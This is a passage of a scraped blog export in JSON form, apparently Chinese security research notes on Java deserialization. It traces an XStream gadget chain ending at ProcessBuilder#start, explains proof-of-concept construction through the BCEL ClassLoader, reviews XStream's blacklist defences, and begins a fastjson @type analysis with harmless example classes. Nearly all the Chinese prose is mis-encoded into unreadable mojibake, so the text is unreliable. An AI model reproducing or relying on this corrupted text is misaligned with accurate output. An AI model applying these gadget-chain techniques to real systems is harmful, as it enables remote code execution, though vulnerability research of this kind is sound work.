com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString javax.activation.DataHandler#getDataSource com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream javax.crypto.CipherInputStream#read -&gt; getMoreData javax.crypto.NullCipher#update -&gt; chooseFirstProvider javax.imageio.spi.FilterIterator#next javax.imageio.ImageIO.ContainsFilter#filter ProcessBuilder#start ‰ªéÂêéÈù¢ÂæÄÂâçÁúãÁöÑËØùÔºåÊàë‰ª¨ÂâçÈù¢ÂÅöÁöÑÊâÄÊúâÊìç‰ΩúÈÉΩÊòØ‰∏∫‰∫ÜËÉΩÂéªËß¶ÂèëIterator.nextÔºåËÄåËøôÁßçIteratorÁöÑÈÅçÂéÜÂ§ÑÁêÜÔºåÊàë‰ª¨ÂæàÂÆπÊòìÂÜçÊâæÂà∞‰∏ÄÂ§ÑÔºå‰∏ã‰∏ÄËäÇÂ∞±ÊòØ‰∏çÁî®javax.imageio.ImageIO.ContainsFilter#filterÊù•ÂÆûÁé∞Âà©Áî®ÔºåËØ∑ÁªßÁª≠ÂæÄ‰∏ãÁúãXD 5. ServiceFinder$LazyIteratorÊÄùË∑ØÊù•Ëá™ÊñáÁ´†1„ÄÅÊñáÁ´†2) ÂÖàÊù•Áúã‰∏Ä‰∏ãjava.util.ServiceLoader.LazyIterator#next ÂΩìÁ±ªÂ±ûÊÄßacc‰∏∫Á©∫Êó∂Ôºå‰ºöÂéªË∞ÉÁî®nextServiceÂáΩÊï∞ÔºåËÄåÂú®ËØ•ÂáΩÊï∞ÈáåÈù¢ÔºåÊàë‰ª¨ÁúãÂà∞‰∫Ü‰ª§‰∫∫ÁÜüÊÇâÁöÑClass.forNameÁöÑË∞ÉÁî®„ÄÇÂπ∂‰∏îÊàë‰ª¨ÂéªÂÆû‰æãÂåñÁöÑclassname„ÄÅloaderÔºåÈÉΩÊòØÁ±ªÂ±ûÊÄßÔºåÂ±û‰∫éÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ÁöÑ‰∏úË•ø„ÄÇ Âà∞‰∫ÜËøôÈáåËá™ÁÑ∂ËÄåÁÑ∂ÁöÑÂ∞±ÊÉ≥Âà∞‰∫Ü‰ΩøÁî®BCELÁöÑClassLoaderÊù•ËΩΩÂÖ•classnameÈáåÁöÑÂ≠óËäÇÁ†Å‰∫Ü(ËøôÈáåÊàëÂú®fastjsonÈÇ£ÁØáÈáåÊèêÂà∞Ëøá)„ÄÇ ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Âú®ImageIOÈÇ£Êù°ÈìæÁöÑÂü∫Á°Ä‰∏äÔºåÂú®Ëß¶ÂèëIterator.nextÊó∂‰ΩøÁî®Ëøô‰∏™LazyIteratorÊù•‰ª£Êõø ‰øÆÊîπBCEL ClassLoaderÊûÑÈÄ†POCËøôÈáåÊù•Êèê‰∏Ä‰∏ãÂÖ≥‰∫éPOCÁöÑÊûÑÈÄ†ÔºåÂ¶ÇÊûú‰Ω†‰ΩøÁî®‰∫ÜÂΩìÂâçËøô‰∏™Âà©Áî®ÈìæÔºåÂπ∂‰∏î‰∏çÂØπClassLoaderÂÅöÂ§ÑÁêÜÁöÑËØùÔºå‰Ω†‰ºöÂèëÁé∞ÊÄé‰πàÈÉΩÊâì‰∏çÈÄöÔºåÂõ†‰∏∫ËøôÈáåÂú®ÂÆûÈôÖËøòÂéüClassLoaderÁöÑÊó∂ÂÄôÂá∫Áé∞‰∫ÜÈîôËØØ ËøôÈáåÊúâ‰∏§ÁßçËß£ÂÜ≥ÊñπÊ°àÔºå‰∏ÄÊòØÂéªÈô§ËøôÁßçËøòÂéüÊúâÈóÆÈ¢òÁöÑÁ±ªÔºà‰ºöÂæàÈ∫ªÁÉ¶ÔºâÔºå‰∫åÊòØÁõ¥Êé•ÊääClassLoaderÈáåÁöÑ‰∏Ä‰∫õÊó†ÂÖ≥Á¥ßË¶ÅÁöÑ‰∏úË•øÂâîÈô§Êéâ„ÄÇ ËøôÈáåÊàëÈÄâÊã©‰∫ÜÁ¨¨‰∫åÁßçÔºåÁªèËøáË∞ÉËØïÂéªÈô§‰∫Ü‰ª•‰∏ãÂá†‰∏™Â±ûÊÄßÁöÑÂÄº ËøôÈáåÁî±‰∫éÊàë‰ª¨ÂâîÈô§‰∫Üignored_packagesÂíådeferToÔºåÂØºËá¥BCELÁöÑClassLoaderÂú®ËΩΩÂÖ•ÊôÆÈÄöÁöÑÁ±ªÁöÑÊó∂ÂÄô‰ºöÂá∫Áé∞Âä†ËΩΩÈîôËØØÁöÑÈóÆÈ¢ò Êù•ÁúãÁúãÊÄé‰πàËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò È¶ñÂÖàBCELÁöÑClassLoader.loadClassÔºå‰∏ÄÂÖ±Â∞ùËØï4Ê¨°‰∏çÂêåÁöÑËΩΩÂÖ•ÊñπÊ≥ï ‰ªéÂΩìÂâçClassLoaderÁöÑclassesÂéªÊâæ ÂØπ‰∫éÈªòËÆ§ÂøΩÁï•ÁöÑÂåÖjava./sun./javax.Ôºå‰ΩøÁî®deferToÂéªÈáçÊñ∞Âä†ËΩΩÔºåËøôÈáåÁöÑdeferToÊòØÁ≥ªÁªüÁöÑClassLoaderÔºàClassLoader.getSystemClassLoader()) ÂØπ‰∫éclassname‰ª•$$BCEL$$ÂºÄÂ§¥ÁöÑÔºåÊ†πÊçÆclassnameÁöÑÂÄºÂéªdefineClassÔºåËøôËæπÂ∞±ÊòØÊàë‰ª¨ÊúÄÂñúÊ¨¢ÁöÑ‰ªªÊÑèËΩΩÂÖ•Â≠óËäÇÁ†ÅÁöÑÂú∞Êñπ ÊúÄÂêé‰∏ÄÊ¨°ÊòØÁî®repositoryÂéªËΩΩÂÖ•ÂΩìÂâçÁöÑclassnameÔºåÂ¶ÇÊûúËøôÈáåËøòÊ≤°ÊâæÂà∞ÔºåÂ∞±‰ºöÁàÜÊ≤°ÊúâÊâæÂà∞ClassÁöÑÈîôËØØ PSÔºöËøôÈÉ®ÂàÜrepositoryÂèñÁöÑSyntheticRepository.getInstance()ÔºåËøò‰∏çÊòØÂæàÊ∏ÖÊ•öËøô‰∏™Â∑¶Âè≥ÔºåÂêéÁª≠Êï¥ÁêÜ‰∏Ä‰∏ãClassLoaderÁõ∏ÂÖ≥ÁöÑÁü•ËØÜÂÜçÂÅöË°•ÂÖÖ ÂÜçÊù•ÁúãÊàë‰ª¨Êä•ÈîôÁöÑÂéüÂõ†ÔºåÂõ†‰∏∫Âà†Èô§ignored_packagesÂíådeferTo‰πãÂêéÔºåÁõ∏ÂΩì‰∫éÁ¨¨‰∫åÁßçÊÉÖÂÜµÊó†Ê≥ïËΩΩÂÖ•‰∫ÜÔºåËÄåÊòæÁÑ∂java.lang.Object‰∏çÁ¨¶ÂêàÁ¨¨‰∏âÁßçÊÉÖÂÜµ„ÄÇÊúÄÂêéÁ¨¨4ÁßçÈáåÈù¢‰πüÊ≤°ÊúâÊâæÂà∞Ëøô‰∏™java.lang.ObjectÔºåÊâÄ‰ª•ÊúÄÁªàÁàÜ‰∫ÜClassNotFoundException ËøôÈáåÂÖ∂ÂÆûÂ∑≤ÁªèÂæàÊòéÊòæ‰∫ÜÔºåËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåÊàë‰ª¨ÂæóÂú®classesÈáåÊ∑ªÂä†Êàë‰ª¨‰º†ÂÖ•ÁöÑclassÂ≠óËäÇÁ†ÅÈáåÊâÄÁî®Âà∞ÁöÑÊâÄÊúâÁ±ªÔºåÈÇ£‰πàÂú®Á¨¨‰∏ÄÊ¨°Â∞ùËØïËΩΩÂÖ•ÁöÑÊó∂ÂÄôÔºåÂ∞±ÊâæÂà∞‰∫ÜÁõ∏Â∫îÁöÑÁ±ªÔºåÊó†ÈúÄÂ∞ùËØïÂêéÁª≠ÁöÑÂá†ÁßçËΩΩÂÖ•ÊñπÂºè„ÄÇ ÊØîÂ¶ÇËøôÈáåÊàë‰∫ßÁîüÁöÑÂ≠óËäÇÁ†ÅÈáåÈù¢Áî®‰∏ä‰∫ÜRuntimeÔºåÂ∞±ÂæóÂä†‰∏äËøô‰∏™Á±ª ËøôÈáåÁöÑObjectÂøÖÈ°ªÂä†‰∏äÔºåÊØïÁ´üÊâÄÊúâÁöÑÂØπË±°ÈÉΩÁªßÊâøËá™Object 0x03 XStreamÁöÑÈò≤Âæ°Êé™ÊñΩ XStreamÂú®1.4.7ÁâàÊú¨‰πãÂêéÊîØÊåÅ‰ΩøÁî®ÁôΩÂêçÂçïÂíåÈªëÂêçÂçïÁöÑÊñπÂºèÊù•ÊñπÂºèÊÅ∂ÊÑèÁ±ªÁöÑÂèçÂ∫èÂàóÂåñsecurity Starting with XStream 1.4.7, it is possible to define permissions for types, to check the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly With these permissions it is at least not possible to inject unexpected types into an object graph. The security framework supports the setup of a black or white listing scenario. Any application should use this feature to limit the danger of arbitrary command execution if it deserializes data from an external source. XStream itself sets up a black list by default, i.e. it blocks all currently known critical classes of the Java runtime. Main reason for the black list is compatibility, because otherwise newer versions of XStream 1.4.x can no longer be used as drop-in replacement. Unfortunately this provides a false sense of security. Every XStream client should therefore switch to a white listing on its own as soon as possible. XStream itself will use white listing as default starting with 1.5.x and only clients that have also changed their setup will be able to use this newer version again as drop-in replacement. ËøôÈáå‰∏ªË¶ÅÁúã‰∏Ä‰∏ãÈªëÂêçÂçïÁöÑÂ§ÑÁêÜ 1.4.7-1.4.9EventHandlerÁöÑÂ§ÑÁêÜÁî±ReflectionConverterÊù•Â§ÑÁêÜÁöÑÔºåÂú®1.4.7-1.4.9ÁâàÊú¨ÔºåÂú®canConvertÂ§ÑÊ∑ªÂä†‰∫ÜÂØπEventHandlerÁöÑÈôêÂà∂ ÊâÄ‰ª•EventHandlerÁöÑPOCÂ∞±Â§±Êïà‰∫ÜÔºå‰ΩÜÊòØÂÖ∂‰ªñÁöÑÂá†ÁßçÂπ∂Ê≤°ÊúâÂ§±Êïà &gt;=1.4.10Âú®1.4.10ÁâàÊú¨Â¢ûÂä†‰∫ÜsetupDefaultSecurityÊñπÂºèÊù•ËÆæÁΩÆÈªòËÆ§ÁöÑÁôΩÂêçÂçïÔºå‰ΩÜÊòØËøô‰∏™ÁâàÊú¨Êää‰∏äÈù¢EventHandlerÁöÑÈôêÂà∂ÂéªÊéâ‰∫ÜÔºåÂØºËá¥ÂèàÂèØ‰ª•‰ΩøÁî®ÊúÄÊó©ÁöÑPOCÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøôÊòØÊ≤°‰øÆË°•ÂâçÁöÑ1.4.10Ôºå‰øÆÂ§çÂêéÂ∑≤Áªè‰∏çÂèØ‰ª•‰∫Ü Èô§‰∫ÜÊñ∞Â¢ûËÆæÁΩÆÁôΩÂêçÂçïÁöÑÊñπÂºèÔºå‰πüÊñ∞Â¢ûÂä†‰∫ÜInternalBlackListËøô‰∏™converterÔºå‰ªñËÆæÁΩÆÁöÑÊùÉÈôê‰∏∫LOWÔºåËÄåReflectionConverterÊùÉÈôê‰∏∫Very_lowÔºåÊâÄ‰ª•‰ºöÂÖàËøá‰∏ÄÊ¨°ÈªëÂêçÂçïÊ£ÄÊü•ÔºàXStreamÂú®Ê≥®ÂÜåconvertersÊó∂Ôºå‰ª•ÊùÉÈôêÁöÑÊñπÂºèÊù•ÂÜ≥ÂÆöÊ¨°Â∫èÔºâ„ÄÇ ÊâÄ‰ª•ËøôÈáå1,4,5ÈÉΩË∑™‰∫ÜÔºåÂè™Ââ©‰∏ãgroovyËøôÁßç‰∫ÜÔºåÂΩìÁÑ∂ËÇØÂÆöËøòÊúâÂÖ∂‰ªñÊ≤°ÊúâÂèëÁé∞ÁöÑÂà©Áî®ÈìæÔºåÊâÄ‰ª•ÊúÄÂÆâÂÖ®ÁöÑÊñπÊ≥ïËøòÊòØ‰ΩøÁî®ÁôΩÂêçÂçïÁöÑÊñπÂºèÔºå‰∏çËÉΩ‰æùËµñXStreamÁöÑÈªëÂêçÂçïÊù•ÂÅöÂÆâÂÖ®Èò≤Âæ°„ÄÇ 0x04 ÊÄªÁªì Êú¨Êñá‰∏ªË¶ÅÂõûÈ°æ‰∫ÜÁé∞ÊúâÁöÑ‰∏Ä‰∫õÂà©Áî®ÈìæÔºåÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºö Â¶ÇÊûúXStreamÁî®ÁöÑ‰∏çÊòØÁôΩÂêçÂçïÊ®°ÂºèÔºåËøòÊòØÂ≠òÂú®Âà©Áî®ÁöÑÂèØËÉΩÊÄßÁöÑ„ÄÇÁé∞ÊúâÂÜÖÁΩÆÁöÑÈªëÂêçÂçïÂè™Á¶ÅÊ≠¢‰∫ÜÂá†‰∏™Áé∞ÊúâÁöÑÂà©Áî®ÈìæÔºåÊàë‰ª¨ËøòÊòØÂèØ‰ª•ÊâæÂà∞ÂÖ∂‰ªñÂèØ‰ª•Âà©Áî®ÁöÑÂà©Áî®ÈìæÁöÑÔºåÊØîÂ¶ÇÂâçÈù¢ÊèêÂà∞ÁöÑGroovyÁöÑÂà©Áî®Èìæ„ÄÇ ÈúÄË¶ÅËÆ∞‰ΩèÁöÑÊòØXStream‰ªñÁöÑËß¶ÂèëÊñπÂºè‰æùËµñÁöÑÊòØHashMap„ÄÅTreeSetËøôÁßçÁ±ªÂûãËá™Âä®Ë∞ÉÁî®ÁöÑhashCode„ÄÅcompareTo‰∏≤Ëµ∑Êù•ÁöÑÔºåÂêéÁª≠ÂèØ‰ª•Ê≥®ÊÑè‰∏Ä‰∏ãËøôÁßçÂèØËÉΩÁöÑË∞ÉÁî®Èìæ„ÄÇ PSÔºöÊú¨ÊñáÊèêÂà∞ÁöÑÊâÄÊúâPOCÔºåÂ∑≤ÁªèÊõ¥Êñ∞Âà∞GitHub‰∏ä"},{"title":"„Äênotes„ÄëÊµÖË∞àfastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥û","permalink":"http://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/","text":"0x00 ÂâçË®ÄÊúÄËøëÂèàÁ¢∞‰∏ä‰∫ÜfastjsonÁöÑÈ¢òÁõÆÔºåÊÉ≥ÁùÄÊòØÊó∂ÂÄôÂàÜÊûê‰∏ÄÊ≥¢Ëøô‰∏™ÊºèÊ¥û‰∫ÜÔºåË∑ü‰∏äÂ∏àÂÇÖ‰ª¨ÁöÑËÑöÊ≠•„ÄÇ 0x01 Âü∫Á°ÄÁü•ËØÜ (1). fastjsonÁöÑÂü∫Á°Ä‰ΩøÁî® fastjsonÊòØÈòøÈáåÂ∑¥Â∑¥ÁöÑÂºÄÊ∫êJSONËß£ÊûêÂ∫ìÔºåÂÆÉÂèØ‰ª•Ëß£ÊûêJSONÊ†ºÂºèÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊîØÊåÅÂ∞ÜJava BeanÂ∫èÂàóÂåñ‰∏∫JSONÂ≠óÁ¨¶‰∏≤Ôºå‰πüÂèØ‰ª•‰ªéJSONÂ≠óÁ¨¶‰∏≤ÂèçÂ∫èÂàóÂåñÂà∞JavaBean„ÄÇ ÂÖàÊù•Áúã‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰æãÂ≠ê 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Phone &#123; public String phoneNumber; public Phone() &#123; &#125; public Phone(String phoneNumber) &#123; this.phoneNumber = phoneNumber; &#125; @Override public String toString()&#123; return this.phoneNumber; &#125;&#125;public class NewPhone extends Phone &#123; public String location; public NewPhone()&#123; &#125; public NewPhone(String phoneNumber, String location) &#123; this.phoneNumber = phoneNumber; this.location = location; &#125; @Override public String toString()&#123; return this.phoneNumber+\":\"+this.location; &#125;&#125;public class Person &#123; public String name; public Phone phone; public Person() &#123; &#125; public Person(String name, Phone phone) &#123; this.name = name; this.phone = phone; &#125; @Override public String toString()&#123; return name+\":\"+phone; &#125;&#125; ‰∏äÈù¢ÂåÖÊã¨‰∫Ü3‰∏™ÁÆÄÂçïÁöÑÂØπË±°Person„ÄÅPhone‰ª•ÂèäNewPhoneÔºåÊàë‰ª¨Áî®fastjsonÂ∞ÜPersonÂØπË±°ËΩ¨ÂåñÊàê‰∏Ä‰∏™jsonÂ≠óÁ¨¶‰∏≤ÔºåÂπ∂ËøòÂéü 123456789Phone phone = new Phone(\"1234567890\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output // &#123;\"name\":\"john\",\"phone\":&#123;\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890 Ë∞ÉÁî®fastjsonÁöÑtoJSONStringÂèØ‰ª•ËΩªÊòìÂú∞Â∞ÜobjectËΩ¨Âåñ‰∏∫jsonÂ≠óÁ¨¶‰∏≤Ôºå‰πüÂèØ‰ª•Áî®parseObjectÂ∞ÜjsonÂ≠óÁ¨¶‰∏≤ËøòÂéüÂá∫Êù•„ÄÇ‰ΩÜÊòØËøôÈáåÊúâ‰∏Ä‰∏™ÈôêÂà∂Â∞±ÊòØ 123456789Phone phone = new NewPhone(\"1234567890\",\"China\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output// &#123;\"name\":\"john\",\"phone\":&#123;\"location\":\"China\",\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890 Âú®‰∏äÈù¢ÁöÑÂÜôÊ≥ï‰∏≠ÔºåÁî±‰∫éfastjson‰∏çÁü•ÈÅìÈúÄË¶ÅËøòÂéüÁöÑPersonÁöÑPhoneÊòØÊú¨Ë∫´ËøòÊòØÂ≠êÁ±ªNewPhoneÔºåÈù¢ÂØπËøôÁßçÂ§öÊÄÅÊñπÂºèÔºåfastjsonËøòÂéüÊòØÁà∂Á±ªÔºåËÄå‰∏çÊòØÂ≠êÁ±ªNewPhone„ÄÇËøôÊÑèÂë≥ÁùÄÊàë‰ª¨‰∏¢Â§±‰∫ÜJsonÂ≠óÁ¨¶‰∏≤‰∏≠phoneÁöÑlocationÂ≠óÊÆµ„ÄÇËøôÊòæÁÑ∂ÊòØ‰∏çÂèØÂøçÂèóÁöÑÔºåÊâÄ‰ª•fastjsonÁªôÊàë‰ª¨Êèê‰æõ‰∫ÜÊåáÂÆöËøòÂéüÁ±ªÁöÑÂ≠óÊÆµ@typeÊñπÊ≥ï 123456789Phone phone = new NewPhone(\"1234567890\",\"China\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output// &#123;\"@type\":\"org.vultest.base.Person\",\"name\":\"john\",\"phone\":&#123;\"@type\":\"org.vultest.base.NewPhone\",\"location\":\"China\",\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890:China ÈÄöËøáÂú®toJSONStringÁöÑÊó∂ÂÄôÊåáÂÆöSerializerFeatureÔºàSerializerFeature.WriteClassNameÔºâÔºå‰ΩøÂæóËΩ¨ÂåñÂêéÁöÑjsonÂ≠óÁ¨¶‰∏≤Â§ö‰∫Ü@typeÂ≠óÊÆµ„ÄÇËøô‰∏™Â≠óÊÆµÊåá‰ª£‰∫ÜÂΩìÂâçÁ±ªÁöÑclassÔºåÈÅøÂÖç‰∫Ü‰∏äÈù¢ÁöÑÂ≠êÁ±ª‰∏¢Â§±Â≠óÊÆµÁöÑÈóÆÈ¢ò„ÄÇÊØîÂ¶Ç‰∏äÈù¢Áõ¥Êé•ÊåáÂÆö‰∫ÜPersonÂØπË±°ÁöÑphoneÂ±ûÊÄßÁöÑÁ±ªÊòØNewPhoneÔºåËøòÂéüÂêéÊàêÂäüÊâìÂç∞Âá∫location„ÄÇ Âà∞‰∫ÜËøôÈáåÔºåÊàë‰ª¨ÂèØ‰ª•ÊÄùËÄÉ‰∏Ä‰∏ãÔºåÂ¶ÇÊûú@typeË¢´ÊåáÂÆö‰∏∫ÊüêÊÅ∂ÊÑèÁöÑÁ±ªÔºåÊòØÂê¶‰ºöÂØºËá¥‰ªªÊÑè‰ª£Á†ÅÊâßË°åÁöÑÊºèÊ¥ûÔºü (2).fastjsonÁöÑÊµÅÁ®ãÁÆÄ‰ªã ËøôÈáåÁõ¥Êé•ÂèÇËÄÉhttps://paper.seebug.org/994/ Áî®‰∏Ä‰∏ãÂªñÂ§ßÁöÑÊµÅÁ®ãÂõæ ÂÖ∑‰ΩìÁöÑÂàÜÊûêËøáÁ®ãÁúã‰∏äÈù¢ÁöÑÈÇ£ÁØáÊñáÁ´†Âç≥ÂèØÔºåËøôÈáåÊèê‰∏Ä‰∏ãÂ∞ÜASMÂä®ÊÄÅÁîüÊàêÁöÑ‰ª£Á†ÅdumpÂá∫Êù•ÁöÑÊñπÊ≥ï Âú®ÂàÜÊûêËøáÁ®ã‰∏≠ÔºåASMÂä®ÊÄÅÁîüÊàê‰∫ÜÁõ∏Â∫îÁöÑbytecodesÔºåËøôÈáåÁî®ideaÁöÑÊñ≠ÁÇπÊù•dumpÊ∫êÁ†Å ÂÖàÂ∞ÜÊñ≠ÁÇπ‰∏ãÂú®com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80 ÁîüÊàêÁöÑbytecodesÂú®codeÈáåÔºåÁî®ÊâßË°åË°®ËææÂºèÁöÑÂäüËÉΩÔºåÊâßË°å(new FileOutputStream(&quot;some.class&quot;)).write(code)Âç≥ÂèØÁîüÊàê (3). fastjson Ëá™Âä®Ë∞ÉÁî®getterÂíåsetterÁ±ª‰ººJavaÁöÑÂèçÂ∫èÂàóÂåñËøáÁ®ã‰ºöËá™Âä®Ë∞ÉÁî®readObjectÂáΩÊï∞ÔºåfastjsonËøòÂéüÂØπË±°Êó∂‰πü‰ºöËá™Âä®Ë∞ÉÁî®‰ª•‰∏ãÂá†‰∏™ÂáΩÊï∞Ôºö Êó†ÂèÇÊï∞ÁöÑÊûÑÈÄ†ÂáΩÊï∞ Á¨¶ÂêàÊù°‰ª∂ÁöÑgetterÂáΩÊï∞ Á¨¶ÂêàÊù°‰ª∂ÁöÑsetterÂáΩÊï∞ ËøôÈáåÈúÄË¶ÅÂå∫Âà´ÁöÑÊòØfastjsonÊâÄ‰ΩøÁî®ÁöÑparseÂáΩÊï∞ÂíåparseObjectÂáΩÊï∞ÊâÄË∞ÉÁî®ÁöÑÂáΩÊï∞Êù°‰ª∂ÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑ„ÄÇÔºàpsÔºöÂ∫èÂàóÂåñÊó∂‰ºöË∞ÉÁî®ÊâÄÊúâgettersÔºâ 1. parse Âíå parseObjectÁöÑÂå∫Âà´Êù•Áúã‰∏Ä‰∏ãparseObjectÂáΩÊï∞ ËøôÈáåparseObjectÂáΩÊï∞‰ºöÈ¶ñÂÖàË∞ÉÁî®JSON.parseÂáΩÊï∞ÔºåÁÑ∂ÂêéÂÜçÂéªË∞ÉÁî®toJSONÂáΩÊï∞„ÄÇ ËøôÈáåtoJSON‰ºöÊääobjÂ•ó‰∏ÄÂ±ÇJSONObjectÂØπË±°Ôºå‰ªñÁöÑÂÆûÁé∞ÊñπÊ≥ïÊòØÂÖànew‰∏Ä‰∏™JSONObjectÔºåÊääobjÂØπË±°ÁªôÂ°´ÂÖÖËøõÂéªÔºõÁÑ∂ÂêéË∞ÉÁî®toJSONStringÊääÁîüÊàêÁöÑJSONObjectËΩ¨Âåñ‰∏∫jsonÂ≠óÁ¨¶‰∏≤ÔºõÊúÄÂêéÂÜçË∞ÉÁî®parseÂáΩÊï∞Â∞ÜËøô‰∏™jsonÂ≠óÁ¨¶‰∏≤ÁªôËøòÂéü„ÄÇ ËøôÈáåÁöÑtoJSONStringÊòØÊàë‰ª¨Â∫èÂàóÂåñÁöÑ‰∏Ä‰∏™ËøáÁ®ãÔºå‰ªñ‰ºöÂéªË∞ÉÁî®Ëøô‰∏™ÂØπË±°ÁöÑÊâÄÊúâgettersÔºå‰πüÂ∞±ÊÑèÂë≥ÁùÄparseObjectÂáΩÊï∞‰ºö‰∏ªÂä®ÂéªË∞ÉgettersÂíåsettersÔºåËÄåparseÂáΩÊï∞Âàô‰ºöË∞ÉÁî®Ëøô‰∏™ÂØπË±°ÁöÑsettersÂíåÁ¨¶ÂêàÊù°‰ª∂ÁöÑgetters(ËøôÈÉ®ÂàÜËßÅÂêéÊñá)„ÄÇ ÈÇ£‰πà‰πüÂ∞±ÊÑèÂë≥ÁùÄÔºåparseObjectÊØîparseÂáΩÊï∞Â§ö‰∫Ü‰∏Ä‰∏™Ë∞ÉÁî®ÊâÄÊúâgettersÁöÑÂà©Áî®ÁÇπ„ÄÇ 2. parseËá™Âä®Ë∞ÉÁî®ÂáΩÊï∞ÁöÑ‰∏ªË¶ÅÈÄªËæëÊé•ÁùÄÊàë‰ª¨Êù•Áúã‰∏Ä‰∏ãJSON.parseÂáΩÊï∞Ëá™Âä®Ë∞ÉÁî®gettersÂíåsettersÁöÑÈÄªËæë„ÄÇ ÂÖàÊù•Áúã‰∏Ä‰∏ãË∞ÉÁî®ÊµÅÁ®ãÔºå‰ª•‰∏ãÂàÜÊûêfastjsonÁâàÊú¨1.2.24 com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialzeÔºàpsÔºöËøôÈáåÂæàÈ∏°Ë¥ºÁöÑÊäädeserializeÁöÑiÁªôÁúÅÁï•‰∫ÜÔºâ È¶ñÂÖàÊòØÁ¨¨570Ë°åË∞ÉÁî®‰∫ÜcreateInstanceÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞Â∞Ü‰ºöÂØπÂΩìÂâçËøòÂéüÁöÑÁ±ªËøõË°åÂÆû‰æãÂåñÔºåËøôÈáå‰ºöËá™Âä®Ë∞ÉÁî®Êó†ÂèÇÊï∞ÁöÑÊûÑÈÄ†ÂáΩÊï∞ ÂÖ∂Ê¨°ÊòØÁ¨¨600Ë°åË∞ÉÁî®‰∫ÜparseFieldÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞Â∞ÜÂØπÊØè‰∏™Á±ªÂ±ûÊÄßËøõË°åÂàùÂßãÂåñ(ÊàñÈÄíÂΩíÁîüÊàêÊñ∞ÁöÑÂØπË±°) Ë∑üËøõparseFieldÂáΩÊï∞ ËøôÈáåË∞ÉÁî®‰∫Ücom/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseFieldÂáΩÊï∞ÔºåÁõ¥Êé•ÁúãÂÖ≥ÈîÆÁÇπÁ¨¨83Ë°åÔºåË∞ÉÁî®‰∫ÜsetValueÂáΩÊï∞ setValueÂáΩÊï∞Â∞±ÊòØfastjsonËá™Âä®Ë∞ÉÁî®getterÂíåsetterÁöÑÂÖ≥ÈîÆÁÇπ Â¶ÇÊûú‰∏çÂ≠òÂú®Áõ∏Â∫îÁöÑgetter„ÄÅsetter„ÄÅisÂáΩÊï∞ÔºåÂàôÂà©Áî®ÂèçÂ∞ÑÊú∫Âà∂Â∞ÜvalueËµãÂÄºÂà∞ÂΩìÂâçÁöÑobject‰∏äÔºàËøôÈáåÂ∞±ÊòØelseÈÉ®ÂàÜÂÅöÁöÑ‰∫ãÊÉÖÔºâ„ÄÇ ËÄåÂΩìfieldInfoÂ≠òÂú®ÂáΩÊï∞Êó∂ÔºåÂ¶ÇÊûúÂêåÊó∂Â≠òÂú®getterÂíåsetterÔºåÂàôË∞ÉÁî®setterÔºåÂ¶ÇÊûúÂè™Â≠òÂú®getterÂàôË∞ÉÁî®getter„ÄÇ ËøôÈáåÊàë‰ª¨ÂÖ≥Ê≥®‰∏Ä‰∏ãfieldInfoÁöÑmethodÊòØÊÄé‰πàÂ°´ÂÖÖÁöÑÂë¢ÔºüËøôÈáåË¶ÅÁúãcom/alibaba/fastjson/util/JavaBeanInfo.java#buildÂáΩÊï∞ÔºåParserConfigÂú®createJavaBeanDeserializerÂáΩÊï∞‰∏≠‰ºöË∞ÉÁî®JavaBeanInfo.buildÂáΩÊï∞Ôºå‰ª•Ê≠§Â°´ÂÖÖfieldInfoÔºå‰πüÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅÂàÜÊûêÁöÑÂá†‰∏™method„ÄÇ ‰∏çÁúãÂÖ∑‰ΩìÁöÑ‰ª£Á†ÅÔºåÂÜô‰∏Ä‰∏ãÁ≠õÈÄâÁöÑÊù°‰ª∂Ôºö setterÊèêÂèñÊù°‰ª∂Ôºö ÂáΩÊï∞ÂêçÈïøÂ∫¶Â§ß‰∫éÁ≠â‰∫é4 ÈùûÈùôÊÄÅÂáΩÊï∞ ÈôêÂà∂ËøîÂõûÁ±ªÂûã‰∏∫voidÊàñÂΩìÂâçÁ±ª ÂáΩÊï∞ÂèÇÊï∞Âè™Êúâ‰∏Ä‰∏™ ÂáΩÊï∞Âêç‰ª•setÂºÄÂ§¥ÔºåÁ¨¨Âõõ‰∏™Â≠óÁ¨¶ÊòØÂ§ßÂÜôÊàñËÄÖunicdeÊàñËÄÖ_ÊàñËÄÖÂ≠óÊØçfÔºõÂ¶ÇÊûúÂáΩÊï∞ÂêçÈïøÂ∫¶&gt;=5ÔºåÁúãÁ¨¨5‰ΩçÂ≠óÁ¨¶ÊòØ‰∏çÊòØÂ§ßÂÜôÁöÑ getterÊèêÂèñÊù°‰ª∂Ôºö ÂáΩÊï∞ÂêçÈïøÂ∫¶Â§ß‰∫éÁ≠â‰∫é4 ÈùûÈùôÊÄÅÂáΩÊï∞ ÂáΩÊï∞Âêç‰ª•getÂºÄÂ§¥ÔºåÁ¨¨Âõõ‰∏™Â≠óÁ¨¶Â§ßÂÜô 